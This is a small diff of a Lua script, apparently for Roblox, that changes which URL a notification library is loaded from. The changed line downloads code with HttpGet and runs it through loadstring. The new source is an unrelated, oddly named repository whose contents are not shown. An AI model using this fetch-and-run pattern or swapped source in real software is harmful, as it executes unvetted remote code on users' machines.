@@ -1,4 +1,4 @@
-local notificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/ui-libraries/main/xaxas-notification/src.lua"))();
+local notificationLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/scripts1001/skididi-toliet/main/dopdop.lua"))();
 local notifications = notificationLibrary.new({            
     NotificationLifetime = 3, 
     NotificationPosition = "Middle",
